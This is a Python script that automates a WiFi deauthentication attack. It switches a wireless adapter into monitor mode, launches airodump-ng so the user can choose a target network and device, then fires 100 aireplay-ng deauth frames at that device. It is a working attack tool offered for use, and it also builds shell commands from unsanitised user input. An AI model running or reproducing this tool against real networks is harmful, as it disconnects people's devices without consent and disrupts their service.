import subprocess as sp
import os
print("\033[1;32;40m *NOTICE* use the Tool as a Root user \n");
print("\033[2;33m Wait a Sec..... \n");

s_w_a=sp.getoutput('iwconfig');
print(s_w_a);
print("\n");

# Wifi adapter name = w_n
w_n = input("\033[1;32;40m           Type the  Wifi adapter Name which you want to use from the above : ");

print("Wait a Sec...............\n");
print(" \033[1;32;41m             Take the required thing's from the Terminal such as 'channel,Bssid,station' and then Press ctrl+C there ");
print("\033[1;32;40m  \n");
wsys=sp.getoutput("ifconfig '"+w_n+"' down && iwconfig '"+w_n+"' mode monitor && ifconfig '"+w_n+"' up ");
os.system("gnome-terminal  -e 'sudo airodump-ng '"+w_n+"''");
 

#bssid mac addr of target wifi

bssid = input("\033[1;32;40m Select the Wifi Bssid from the above result : " );

#station mac addr of target device on that wifi

station = input("Selet the Mac addr of the target device : ");

channel = input("Type the Channel of the Target wifi : ");

# attack

print (" \n wait............................ \n");

sp.getoutput("iwconfig '"+w_n+"' channel '"+channel+"'");

os.system("gnome-terminal -e 'ifconfig '"+w_n+"' down'");
os.system("gnome-terminal -e 'iwconfig '"+w_n+"' mode monitor'");
os.system("gnome-terminal -e 'ifconfig '"+w_n+"' up'");
os.system("gnome-terminal -e 'aireplay-ng --deauth 100 -a '"+bssid+"' -c '"+station+"' '"+w_n+"''");

exit();
